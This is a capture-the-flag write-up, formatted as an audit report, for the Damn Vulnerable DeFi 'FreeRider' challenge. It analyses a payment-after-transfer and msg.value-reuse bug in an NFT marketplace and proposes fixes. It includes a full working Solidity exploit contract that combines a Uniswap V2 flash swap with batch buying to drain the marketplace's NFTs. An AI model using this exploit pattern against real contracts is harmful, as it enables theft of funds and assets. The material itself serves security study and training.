# FreeRider — Audit Report

**Protocol:** Damn Vulnerable DeFi (FreeRider CTF)<br>
**Challenge:** FreeRider — NFT Marketplace Rescue <br>
**Time Spent:** ~2 hours (1:56 PM - close to 4:00 PM)<br>
**Status:** Solved 
---

## Executive Summary

**Vulnerability Found:** The NFT marketplace contains a payment-after-transfer bug where ownership is transferred before payment, combined with msg.value reuse across loop iterations, allowing an attacker to purchase all NFTs with a single payment and receive the payment back.

**Severity:** Critical

**Attack Complexity:** Low (requires flash loan integration exploit trivial once bug identified)

**Impact:** Complete drain of marketplace NFTs (6 NFTs worth 90 ETH) with zero net cost to attacker, plus 45 ETH bounty claim

**Root Cause:** Incorrect operation ordering in _buyOne() — ownership transferred before payment, and buyMany() uses the same msg.value for each iteration rather than requiring the total sum up-front.

---

## Challenge Overview

**Objective:** Rescue all 6 NFTs from the vulnerable marketplace and deliver them to the recovery contract to claim the 45 ETH bounty.

**Initial State:**
- Marketplace balance: 90 ETH (from initial NFT sales setup)
- Marketplace NFTs: 6 NFTs (IDs 0-5), each priced at 15 ETH
- Player balance: 0.1 ETH (insufficient to buy even one NFT)
- Recovery contract: 45 ETH bounty
- Relevant contracts: `FreeRiderNFTMarketplace.sol`, `FreeRiderRecoveryManager.sol`, `DamnValuableNFT.sol`, Uniswap V2 pair (WETH/DVT)

**Success Criteria:**
- [ ] Drain all 6 NFTs from marketplace (marketplace NFT balance = 0)
- [ ] Transfer all NFTs to recovery contract
- [ ] Claim 45 ETH bounty from recovery contract
- [ ] Marketplace loses 90 ETH worth of NFTs without receiving proper payment

---

## Vulnerability Analysis

### Economic Incentive Analysis

**Attack Priority:**

1. **Payment-after-transfer + msg.value reuse exploit** — Potential profit: 6 NFTs (90 ETH value) + 45 ETH bounty = 135 ETH equivalent, Cost: Flash loan fee (~0.045 ETH)  
   - Likelihood: High (code review confirms exploitability)  
   - Impact: Critical (complete marketplace drain)

2. **Direct purchase** — Notes: Not feasible; player only has 0.1 ETH vs 90 ETH required

### Technical Analysis

**Vulnerable Component:** `FreeRiderNFTMarketplace._buyOne()` / `buyMany()` loop mechanism

**Location:** 
- `FreeRiderNFTMarketplace.sol` — `_buyOne()` and `buyMany()` functions
- Payment logic ordering issue
- msg.value validation in loop context

**Vulnerability Type:** Logic bug (incorrect state change ordering) + msg.value reuse in loop

**Code Review:**

```solidity
// buyMany() - msg.value is constant across all iterations
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
            _buyOne(tokenIds[i]); // ← msg.value doesn't decrease per iteration!
        }
    }
}

// _buyOne() - payment-after-transfer bug
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment(); // ← Checks same msg.value every iteration
    }

    --offersCount;

    // ❌ BUG: Transfer ownership FIRST
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // ❌ BUG: Pay NEW owner (buyer) instead of old owner (seller)!
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

**Why This Is Exploitable:**

* **Payment-after-transfer bug:** After `safeTransferFrom`, `ownerOf(tokenId)` returns the buyer's address, not the seller's. Payment goes to buyer (attacker), not deployer.
* **msg.value reuse:** `msg.value` is transaction-scoped and doesn't change during loop execution. Sending 15 ETH allows purchasing all 6 NFTs (each checking `15 >= 15`).
* **Net result:** Buy all 6 NFTs with one 15 ETH payment, receive 15 ETH back after each purchase (payment to self), end with 15 ETH + 6 NFTs.
* **Flash loan enables attack:** With only 0.1 ETH initial balance, attacker uses Uniswap V2 flash swap to borrow 15 WETH temporarily.

**Attack Prerequisites:**

* [x] Player has 0.1 ETH (available, though insufficient alone)
* [x] Uniswap V2 pair with WETH liquidity for flash swap
* [x] Understanding of ERC721 `safeTransferFrom` callback mechanism for bounty claim
* [x] Recovery contract's `onERC721Received` logic for bounty distribution

---

## Attack Vector

### Thought Process & Discovery

> **Initial Analysis (1:56 PM):**
> "I only have 0.1 ETH and I don't own an NFT. The only function that concerns me at this point is `buyMany`."

> **Critical Discovery (~2:30 PM):**
> "While simulating a test I discovered something... the log shows the balances of parties I suspect to be receiving the sent ether, nothing changed why is that?"
> ```
> pre: marketplace balance 90 ETH
> pre: buyer balance 100 ETH
> post: deployer balance (no change)
> post: marketplace balance 90 ETH (no change!)
> post: buyer balance 100 ETH (no change!)
> ```

> **Eureka Moment:**
> "Upon closer inspection at the buyOne function, I noticed this:
> ```solidity
> _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
> // pay seller using cached token
> payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
> ```
> The contract essentially transfers ownership to the buyer, then pays the same owner the transferred ETH, instead of the actual owner (the deployer), rather the payment should have come before the transfer of ownership."

> **Flash Loan Realization:**
> "While looking at the test file, I was baffled as why UniswapV2 factory and Uniswap contracts were being imported... until now. In light of what I saw in the buyOne function, my approach would be to take a flashloan of 15 ETH ~~90 ETH~~ [NOTE: Initially thought 90 ETH, but realized only 15 ETH needed since msg.value doesn't change in loop], all in the same transaction, call the marketplace contract to buy all NFTs."

> **msg.value Insight:**
> "I suspected it [only needing 15 ETH], cause the function doesn't loop through to check the individual prices, I forgot about it when I got overjoyed cause I cracked the solution."

### Step-by-Step Exploit

**Phase 1: Flash Swap Capital**

1. Request flash swap of 15 WETH from Uniswap V2 pair
2. Uniswap V2 calls `uniswapV2Call()` callback on exploit contract
3. Convert 15 WETH to 15 ETH

**Phase 2: Exploit Marketplace**

4. Call `marketplace.buyMany([0,1,2,3,4,5])` with `msg.value = 15 ETH`
5. For each NFT (0-5):
   - Check: `msg.value (15 ETH) >= priceToPay (15 ETH)` ✅ (passes for all iterations)
   - Transfer NFT ownership to attacker
   - Send 15 ETH payment to `ownerOf(tokenId)` = attacker (new owner)
   - Net effect: 0 ETH spent, attacker still has 15 ETH
6. Attacker now owns all 6 NFTs and still has 15 ETH

**Phase 3: Repay Flash Loan**

7. Calculate flash swap fee: `(15 ETH * 3) / 997 + 1 ≈ 0.045 ETH` (0.3%)
8. Convert `15 + 0.045 = 15.045 ETH` back to WETH
9. Transfer 15.045 WETH back to Uniswap pair

**Phase 4: Claim Bounty via ERC721 Callback**

> **Bounty Mechanism Understanding:**
> "The onReceived function checks:
> - if msg.sender is address(nft) — How? Using `safeTransferFrom` triggers callback where msg.sender becomes NFT contract
> - if tx.origin is beneficiary — I will trigger the txn, makes me tx.origin
> - if token ID is <= 5 — I have ids 0-5
> - if the owner of said token ID is this contract — I transfer ownership to the recovery contract
> - if received is 6, pay the recipient `address recipient = abi.decode(_data, (address));` the bounty amount"

10. For each NFT (0-5):
    - Call `nft.safeTransferFrom(exploitContract, recoveryManager, tokenId, abi.encode(player))`
    - NFT contract calls `recoveryManager.onERC721Received()`
    - Inside callback: `msg.sender = address(nft)` ✅
    - After 6th NFT transfer, recovery contract decodes player address and sends 45 ETH bounty

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IWETH} from "../../src/WETH.sol";

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

/**
 * @title FreeRiderExploit
 * @notice Exploits payment-after-transfer bug + msg.value reuse in FreeRider marketplace
 * @dev Uses Uniswap V2 flash swap for capital, purchases all NFTs with single payment
 */
contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public immutable uniswapPair;
    IFreeRiderNFTMarketplace public immutable marketplace;
    IERC721 public immutable nft;
    IWETH public immutable weth;
    address public immutable recovery;
    address public immutable player;
    
    uint256 private constant NFT_PRICE = 15 ether;
    uint256 private constant FLASH_LOAN_AMOUNT = 15 ether;
    
    constructor(
        address _uniswapPair,
        address _marketplace,
        address _nft,
        address _weth,
        address _recovery,
        address _player
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
        recovery = _recovery;
        player = _player;
    }
    
    function attack() external {
        require(msg.sender == player, "Only player");
        
        // Request flash swap: 15 WETH from Uniswap V2
        bytes memory data = abi.encode(player);
        uniswapPair.swap(FLASH_LOAN_AMOUNT, 0, address(this), data);
    }
    
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(uniswapPair), "Only pair");
        require(sender == address(this), "Invalid sender");
        
        // Convert WETH to ETH
        weth.withdraw(FLASH_LOAN_AMOUNT);
        
        // Buy all NFTs with single payment (exploits bugs)
        _buyAllNFTs();
        
        // Repay flash swap + 0.3% fee
        uint256 fee = (FLASH_LOAN_AMOUNT * 3) / 997 + 1;
        uint256 amountToRepay = FLASH_LOAN_AMOUNT + fee;
        
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);
        
        // Transfer NFTs to recovery for bounty
        _claimBounty(abi.decode(data, (address)));
    }
    
    function _buyAllNFTs() private {
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        
        // Single 15 ETH payment buys all 6 NFTs due to:
        // 1. msg.value doesn't decrease in loop
        // 2. Payment goes back to us (new owner) after each transfer
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
    }
    
    function _claimBounty(address recipient) private {
        // Transfer all 6 NFTs to recovery contract
        // After 6th NFT, recovery pays bounty to decoded recipient
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                recovery,
                i,
                abi.encode(recipient)
            );
        }
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    receive() external payable {}
}
```

**Test assertions:**
* `assertEq(address(marketplace).balance, 90 ether)` // Before exploit

// After buying with 15 ETH
`marketplace.buyMany{value: 15 ether}(tokenIds)`
* `assertEq(nft.ownerOf(0), player)`
* `assertEq(nft.ownerOf(5), player)`
* `assertEq(address(marketplace).balance, 90 ether)` // marketplace unchanged
* `assertEq(address(player).balance, PLAYER_INITIAL_ETH_BALANCE)` // attacker still has 15 ETH
* `assertEq(nft.balanceOf(address(marketplace)), 0)` // Marketplace drained of NFTs
* `assertEq(nft.balanceOf(recovery), 6)` // Recovery has all 6 NFTs
* `assertGt(player.balance, PLAYER_INITIAL_ETH_BALANCE)` // Player received bounty

---

## Recommendations

### Immediate Fixes

**1. Fix Payment-After-Transfer Bug**

```solidity
// BEFORE (vulnerable)
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay); // ← Pays buyer!
}

// AFTER (fixed)
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    address seller = _token.ownerOf(tokenId); // ✅ Cache seller before transfer
    
    _token.safeTransferFrom(seller, msg.sender, tokenId);
    payable(seller).sendValue(priceToPay); // ✅ Pay cached seller address
}
```

**2. Fix msg.value Reuse in buyMany()**

```solidity
// BEFORE (vulnerable)
function buyMany(uint256[] calldata tokenIds) external payable {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        _buyOne(tokenIds[i]); // ← Each iteration checks same msg.value
    }
}

// AFTER (fixed)
function buyMany(uint256[] calldata tokenIds) external payable {
    uint256 totalPrice = 0;
    
    // Calculate total cost first
    for (uint256 i = 0; i < tokenIds.length; i++) {
        totalPrice += offers[tokenIds[i]];
    }
    
    require(msg.value >= totalPrice, "Insufficient payment");
    
    // Execute purchases
    for (uint256 i = 0; i < tokenIds.length; i++) {
        _buyOne(tokenIds[i]);
    }
    
    // Refund excess
    if (msg.value > totalPrice) {
        payable(msg.sender).sendValue(msg.value - totalPrice);
    }
}
```

**3. Use Pull Payment Pattern**

* Instead of pushing payments immediately, let sellers withdraw earnings
* Prevents payment-after-transfer issues entirely
* More gas efficient and safer

```solidity
mapping(address => uint256) public pendingWithdrawals;

function _buyOne(uint256 tokenId) private {
    address seller = _token.ownerOf(tokenId);
    uint256 price = offers[tokenId];
    
    _token.safeTransferFrom(seller, msg.sender, tokenId);
    pendingWithdrawals[seller] += price; // Track instead of send
}

function withdraw() external nonReentrant {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    payable(msg.sender).sendValue(amount);
}
```

**4. Operational/Process Improvements**

* Comprehensive unit tests covering multi-purchase scenarios
* Fuzz testing for various msg.value and token ID combinations
* External security audit before mainnet deployment
* Formal verification of critical payment logic

---

## Lessons Learned

### Pattern Identified

**Pattern Name:** `Payment-After-State-Change`

**Description:** Performing external calls or payments after state changes that affect the payment recipient, leading to incorrect fund distribution.

**Where This Appears:**

* NFT marketplaces with batch purchase functions
* Token sale contracts with transfer-then-refund logic
* Auction contracts with immediate payment after ownership transfer
* Any contract where payment depends on current state that gets modified before payment

**How to Spot It:**

```markdown
Red flags:
- Payment sent to result of state query (e.g., `ownerOf()`) after state changes
- Transfer/mint/burn operations before corresponding payment/refund
- msg.value validation in loops without cumulative tracking
- External calls that modify state before internal accounting settles
```

### Key Takeaways

1. **Always cache addresses before state changes:** If payment depends on contract state, capture the address before modifying that state
2. **msg.value is transaction-scoped:** Never assume msg.value changes within a transaction; always track cumulative costs explicitly
3. **Flash loans eliminate capital requirements:** Any exploit that requires temporary capital can be executed with flash loans; design assuming attackers have infinite capital for single transactions
4. **ERC721 callbacks create new execution contexts:** `safeTransferFrom` changes `msg.sender` to NFT contract address in `onERC721Received` callbacks; useful for validation but can enable unexpected flows

### Real-World Examples

* **OpenSea Wyvern Protocol** — Various marketplace exploits (2021-2022) involving incorrect payment flows
* **Multiple NFT marketplaces** — Payment-before-validation bugs leading to free NFT mints
* **Harvest Finance** — Flash loan attack demonstrating zero-capital exploit feasibility (2020)

---

## Metadata

**Tools Used:** Foundry, manual contract review, transaction simulation, balance logging
**Pattern Library Entry:** `#free-rider-payment-after-transfer`
**Time Breakdown:**

* 1:56-2:20 PM — Initial contract analysis, understanding marketplace mechanics
* 2:20-2:45 PM — Transaction simulation, balance logging, discovery of no-balance-change bug
* 2:45-3:15 PM — Root cause analysis of `_buyOne()` payment-after-transfer bug
* 3:15-3:40 PM — Flash loan strategy design, Uniswap V2 integration planning
* 3:40-4:00 PM — Recovery contract analysis, ERC721 callback mechanism understanding

**Total Time:** ~2 hours

---

*Report generated on [04-11-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [https://x.com/0xUnavailable]*

---